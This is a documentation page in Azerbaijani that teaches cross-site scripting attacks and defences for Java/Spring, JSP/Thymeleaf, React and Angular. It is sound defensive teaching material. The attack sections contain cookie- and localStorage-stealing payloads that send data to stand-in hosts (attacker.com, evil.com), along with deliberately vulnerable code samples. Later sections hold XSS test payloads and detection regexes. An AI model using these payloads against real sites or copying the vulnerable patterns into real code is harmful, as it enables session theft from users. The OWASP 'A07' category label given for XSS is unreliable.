---
title: Cross-Site Scripting (XSS)
sidebar_label: XSS
description: XSS hücumları və müdafiə metodları
slug: security/xss
tags: [xss, security, web-security, input-validation, output-encoding]
keywords: [xss, cross-site scripting, input validation, output encoding, sanitization]
hide_table_of_contents: false
---

# Cross-Site Scripting (XSS)

- **Cross-Site Scripting (XSS):** Zərərli JavaScript kodlarının veb səhifələrinə daxil edilərək digər istifadəçilərin brauzerlərində icra edilməsi.
- **Client-side Attack:** Server deyil, istifadəçinin brauzeri hədəflənir.
- **Input Validation:** İstifadəçi girişlərinin düzgün filtrlənməməsi səbəbi.
- **Output Encoding:** Məlumatların brauzerdə təhlükəsiz göstərilməməsi problemi.
- **OWASP Top 10:** A07 - Cross-Site Scripting kateqoriyasında yer alır.

## XSS Hücum Növləri

### 1. Stored XSS (Persistent XSS)

**Prinsip:** Zərərli kod server-də saxlanılır və digər istifadəçilərə göstərilir.

**Zəif Kod:**
```java
// TEHLÜKƏLİ - Input validation yoxdur
@RestController
public class CommentController {
    
    @PostMapping("/comments")
    public ResponseEntity<String> addComment(@RequestBody CommentRequest request) {
        Comment comment = new Comment();
        comment.setContent(request.getContent()); // Filtrlənməmiş məzmun
        comment.setAuthor(request.getAuthor());
        
        commentService.save(comment);
        return ResponseEntity.ok("Comment saved");
    }
}

// Template-də təhlükəsiz olmayan render
// Thymeleaf
<div th:utext="${comment.content}"></div> <!-- th:utext təhlükəlidir -->

// JSP
<p>${comment.content}</p> <!-- Escape edilməyib -->
```

**Hücum Nümunəsi:**
```javascript
// Hücumçu bu məzmunu comment kimi göndərir
<script>
    // Cookie oğurluq
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: document.cookie
    });
</script>

// Və ya daha mürəkkəb
<img src="x" onerror="
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://attacker.com/steal');
    xhr.send(JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        url: window.location.href
    }));
">
```

### 2. Reflected XSS

**Prinsip:** Zərərli kod URL parametrində göndərilir və response-da əks etdirilir.

**Zəif Kod:**
```java
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q); // Filtrlənməmiş query
    model.addAttribute("results", searchService.search(q));
    return "search-results";
}
```

**Template:**
```html
<!-- Thymeleaf - təhlükəsiz olmayan -->
<h2>Search results for: <span th:utext="${query}"></span></h2>

<!-- JSP - təhlükəsiz olmayan -->
<h2>Search results for: ${query}</h2>
```

**Hücum URL-i:**
```
https://example.com/search?q=<script>alert('XSS')</script>
https://example.com/search?q=<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

### 3. DOM-based XSS

**Prinsip:** JavaScript kodu DOM-u təhlükəsiz olmayan şəkildə manipulyasiya edir.

**Zəif JavaScript:**
```javascript
// URL-dən parameter oxu
function getUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

// TEHLÜKƏLİ - innerHTML istifadəsi
function displayWelcome() {
    const username = getUrlParameter('username');
    document.getElementById('welcome').innerHTML = 'Welcome, ' + username; // XSS riski!
}

// TEHLÜKƏLİ - eval istifadəsi
function processCallback() {
    const callback = getUrlParameter('callback');
    eval(callback); // Çox təhlükəli!
}

// TEHLÜKƏLİ - document.write
function showMessage() {
    const msg = window.location.hash.substring(1);
    document.write('<div>' + msg + '</div>'); // XSS riski!
}
```

**Hücum URL-i:**
```
https://example.com/page?username=<img src=x onerror="alert('XSS')">
https://example.com/page#<script>fetch('https://evil.com/steal?data='+btoa(document.cookie))</script>
```

## Təhlükəsiz Kodlaşdırma Praktikaları

### 1. Input Validation

**Spring Boot Validation:**
```java
public class CommentRequest {
    
    @NotBlank(message = "Content cannot be blank")
    @Size(max = 1000, message = "Content cannot exceed 1000 characters")
    @Pattern(regexp = "^[a-zA-Z0-9\\s\\p{Punct}]*$", 
             message = "Content contains invalid characters")
    private String content;
    
    @NotBlank(message = "Author cannot be blank")
    @Size(max = 50, message = "Author name cannot exceed 50 characters")
    @Pattern(regexp = "^[a-zA-Z\\s]*$", message = "Author name can only contain letters")
    private String author;
    
    // getters/setters
}

@RestController
public class SecureCommentController {
    
    @PostMapping("/comments")
    public ResponseEntity<String> addComment(@Valid @RequestBody CommentRequest request) {
        
        // Additional sanitization
        String sanitizedContent = htmlSanitizer.sanitize(request.getContent());
        
        Comment comment = new Comment();
        comment.setContent(sanitizedContent);
        comment.setAuthor(request.getAuthor());
        
        commentService.save(comment);
        return ResponseEntity.ok("Comment saved");
    }
}
```

### 2. Output Encoding

**Thymeleaf - Təhlükəsiz Rendering:**
```html
<!-- Avtomatik HTML escape -->
<div th:text="${comment.content}"></div>

<!-- Manual escape -->
<div th:text="${#strings.escapeXml(comment.content)}"></div>

<!-- JavaScript context üçün -->
<script th:inline="javascript">
    var content = /*[[${comment.content}]]*/ '';  // Avtomatik escape edilir
</script>

<!-- URL context üçün -->
<a th:href="@{/profile(id=${#httpServletRequest.getParameter('userId')})}" 
   th:text="${userName}"></a>
```

**JSP - JSTL ilə Escape:**
```jsp
<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>

<!-- HTML escape -->
<p><c:out value="${comment.content}" /></p>

<!-- Manual escape -->
<p>${fn:escapeXml(comment.content)}</p>

<!-- JavaScript context -->
<script>
    var content = '<c:out value="${comment.content}" escapeXml="true" />';
</script>
```

### 3. HTML Sanitization

**OWASP HTML Sanitizer:**
```java
@Component
public class HtmlSanitizer {
    
    private final PolicyFactory policy;
    
    public HtmlSanitizer() {
        this.policy = Sanitizers.FORMATTING
            .and(Sanitizers.BLOCKS)
            .and(Sanitizers.LINKS);
    }
    
    public String sanitize(String html) {
        if (html == null) return null;
        return policy.sanitize(html);
    }
    
    public String sanitizeForComment(String content) {
        PolicyFactory commentPolicy = new HtmlPolicyBuilder()
            .allowElements("b", "i", "em", "strong", "br", "p")
            .allowTextIn("b", "i", "em", "strong", "p")
            .toFactory();
        
        return commentPolicy.sanitize(content);
    }
}

// Maven dependency
// <dependency>
//     <groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
//     <artifactId>owasp-java-html-sanitizer</artifactId>
//     <version>20220608.1</version>
// </dependency>
```

**Custom Sanitizer:**
```java
@Component
public class CustomHtmlSanitizer {
    
    private static final Pattern SCRIPT_PATTERN = 
        Pattern.compile("<script[^>]*>.*?</script>", Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
    
    private static final Pattern JAVASCRIPT_PATTERN = 
        Pattern.compile("javascript:", Pattern.CASE_INSENSITIVE);
    
    private static final Pattern ONLOAD_PATTERN = 
        Pattern.compile("on\\w+\\s*=", Pattern.CASE_INSENSITIVE);
    
    public String sanitize(String input) {
        if (input == null) return null;
        
        String result = input;
        
        // Remove script tags
        result = SCRIPT_PATTERN.matcher(result).replaceAll("");
        
        // Remove javascript: URLs
        result = JAVASCRIPT_PATTERN.matcher(result).replaceAll("");
        
        // Remove event handlers
        result = ONLOAD_PATTERN.matcher(result).replaceAll("");
        
        // HTML encode special characters
        result = result.replace("<", "&lt;")
                      .replace(">", "&gt;")
                      .replace("\"", "&quot;")
                      .replace("'", "&#x27;")
                      .replace("/", "&#x2F;");
        
        return result;
    }
}
```

### 4. Content Security Policy (CSP)

**XSS müdafiəsi üçün CSP:**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> 
            headers.contentSecurityPolicy(
                "default-src 'self'; " +
                "script-src 'self' 'nonce-{nonce}'; " +
                "style-src 'self' 'unsafe-inline'; " +
                "img-src 'self' data: https:; " +
                "connect-src 'self'; " +
                "font-src 'self'; " +
                "object-src 'none'; " +
                "base-uri 'self'; " +
                "form-action 'self'"
            )
        );
        return http.build();
    }
}
```

## Frontend Təhlükəsizliyi

### 1. Secure JavaScript

**Təhlükəsiz DOM Manipulation:**
```javascript
// TEHLÜKƏLİ
function displayUserContent(content) {
    document.getElementById('content').innerHTML = content; // XSS riski!
}

// TƏHLÜKƏSİZ
function displayUserContentSafe(content) {
    const element = document.getElementById('content');
    element.textContent = content; // Avtomatik escape
}

// TƏHLÜKƏSİZ - sanitize library ilə
function displayUserContentWithSanitizer(content) {
    const sanitized = DOMPurify.sanitize(content);
    document.getElementById('content').innerHTML = sanitized;
}
```

**Event Handler Təhlükəsizliyi:**
```javascript
// TEHLÜKƏLİ
function addClickHandler(selector, code) {
    const element = document.querySelector(selector);
    element.onclick = new Function(code); // eval kimi təhlükəli!
}

// TƏHLÜKƏSİZ
function addClickHandlerSafe(selector, callback) {
    const element = document.querySelector(selector);
    element.addEventListener('click', callback);
}
```

**URL Manipulation:**
```javascript
// TEHLÜKƏLİ
function redirectToPage(url) {
    window.location = url; // Open redirect riski
}

// TƏHLÜKƏSİZ
function redirectToPageSafe(url) {
    // URL whitelist yoxla
    const allowedDomains = ['example.com', 'subdomain.example.com'];
    const urlObj = new URL(url);
    
    if (allowedDomains.includes(urlObj.hostname)) {
        window.location = url;
    } else {
        console.warn('Redirect to external domain blocked:', url);
    }
}
```

### 2. DOMPurify İstifadəsi

**Frontend Sanitization:**
```html
<!-- DOMPurify library -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>

<script>
// HTML content-i təmizlə
function sanitizeAndDisplay(htmlContent, targetId) {
    const clean = DOMPurify.sanitize(htmlContent, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href'],
        ALLOW_DATA_ATTR: false
    });
    
    document.getElementById(targetId).innerHTML = clean;
}

// React component-də istifadə
function CommentComponent({ comment }) {
    const sanitizedContent = DOMPurify.sanitize(comment.content);
    
    return (
        <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
    );
}
</script>
```

## Framework-specific Həllər

### React/Next.js

**Secure React Practices:**
```jsx
import DOMPurify from 'dompurify';

function CommentComponent({ comment }) {
    // TƏHLÜKƏSİZ - React avtomatik escape edir
    return (
        <div>
            <h3>{comment.author}</h3>
            <p>{comment.content}</p>
        </div>
    );
}

function RichCommentComponent({ comment }) {
    // HTML content üçün sanitize et
    const sanitizedContent = DOMPurify.sanitize(comment.content);
    
    return (
        <div>
            <h3>{comment.author}</h3>
            <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
        </div>
    );
}

// Custom hook
function useSanitizedContent(htmlContent) {
    return useMemo(() => DOMPurify.sanitize(htmlContent), [htmlContent]);
}
```

### Angular

**Angular Security:**
```typescript
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  template: `
    <!-- Angular avtomatik escape edir -->
    <div>{{userInput}}</div>
    
    <!-- HTML content üçün -->
    <div [innerHTML]="sanitizedHtml"></div>
  `
})
export class CommentComponent {
  sanitizedHtml: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {}
  
  setHtmlContent(htmlContent: string) {
    this.sanitizedHtml = this.sanitizer.sanitize(SecurityContext.HTML, htmlContent);
  }
}
```

## Testing və Detection

### 1. XSS Test Cases

**JUnit Tests:**
```java
@SpringBootTest
public class XssProtectionTest {
    
    @Autowired
    private MockMvc mockMvc;
    
    @Test
    public void testScriptTagBlocked() throws Exception {
        String maliciousInput = "<script>alert('XSS')</script>";
        
        mockMvc.perform(post("/comments")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"content\":\"" + maliciousInput + "\"}"))
                .andExpect(status().isBadRequest());
    }
    
    @Test
    public void testEventHandlerBlocked() throws Exception {
        String maliciousInput = "<img src=x onerror=\"alert('XSS')\">";
        
        MvcResult result = mockMvc.perform(post("/comments")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"content\":\"" + maliciousInput + "\"}"))
                .andExpect(status().isOk())
                .andReturn();
                
        // Verify content is sanitized
        String response = result.getResponse().getContentAsString();
        assertThat(response).doesNotContain("onerror");
        assertThat(response).doesNotContain("alert");
    }
    
    @Test
    public void testJavaScriptUrlBlocked() throws Exception {
        String maliciousInput = "<a href=\"javascript:alert('XSS')\">Click me</a>";
        
        // Test implementation...
    }
}
```

### 2. Automated XSS Testing

**Selenium Tests:**
```java
@Test
public void testXssInSearchPage() {
    WebDriver driver = new ChromeDriver();
    
    try {
        // Navigate to search page with XSS payload
        driver.get("http://localhost:8080/search?q=<script>window.xssDetected=true</script>");
        
        // Check if XSS was executed
        Boolean xssExecuted = (Boolean) ((JavascriptExecutor) driver)
            .executeScript("return window.xssDetected === true");
            
        assertThat(xssExecuted).isNull(); // XSS olmamalıdır
        
    } finally {
        driver.quit();
    }
}
```

## Monitoring və Alerting

### 1. XSS Attack Detection

**Security Filter:**
```java
@Component
public class XssDetectionFilter implements Filter {
    
    private static final Pattern XSS_PATTERN = Pattern.compile(
        ".*(<script[^>]*>.*</script>|javascript:|on\\w+\\s*=|<img[^>]*onerror)",
        Pattern.CASE_INSENSITIVE | Pattern.DOTALL
    );
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        
        // Check all parameters for XSS
        for (String paramName : httpRequest.getParameterMap().keySet()) {
            String[] paramValues = httpRequest.getParameterValues(paramName);
            for (String paramValue : paramValues) {
                if (containsXss(paramValue)) {
                    logXssAttempt(httpRequest, paramName, paramValue);
                    
                    HttpServletResponse httpResponse = (HttpServletResponse) response;
                    httpResponse.setStatus(HttpServletResponse.SC_BAD_REQUEST);
                    httpResponse.getWriter().write("Malicious input detected");
                    return;
                }
            }
        }
        
        chain.doFilter(request, response);
    }
    
    private boolean containsXss(String input) {
        return input != null && XSS_PATTERN.matcher(input).matches();
    }
    
    private void logXssAttempt(HttpServletRequest request, String paramName, String paramValue) {
        String clientIp = getClientIpAddress(request);
        String userAgent = request.getHeader("User-Agent");
        
        logger.warn("XSS attempt detected: IP={}, Parameter={}, Value={}, UserAgent={}", 
                   clientIp, paramName, paramValue, userAgent);
                   
        // Metrics
        Metrics.counter("security.xss_attempts",
                       "parameter", paramName,
                       "ip", clientIp).increment();
    }
}
```

### 2. CSP Violation Reporting

**CSP Report Handler:**
```java
@RestController
public class CspReportController {
    
    @PostMapping("/csp-report")
    public ResponseEntity<Void> handleCspViolation(@RequestBody CspReport report) {
        
        logger.warn("CSP Violation: directive={}, blocked={}, source={}", 
                   report.getViolatedDirective(),
                   report.getBlockedUri(),
                   report.getSourceFile());
        
        // Potential XSS attempt detection
        if (isLikelyXssAttempt(report)) {
            alertService.sendXssAlert(report);
        }
        
        return ResponseEntity.ok().build();
    }
    
    private boolean isLikelyXssAttempt(CspReport report) {
        String blockedUri = report.getBlockedUri();
        return blockedUri != null && 
               (blockedUri.startsWith("data:") || 
                blockedUri.contains("javascript:") ||
                report.getViolatedDirective().contains("script-src"));
    }
}
```

XSS hücumlarından qorunmaq üçün input validation, output encoding və CSP kimi müdafiə mexanizmlərini birlikdə istifadə edin.
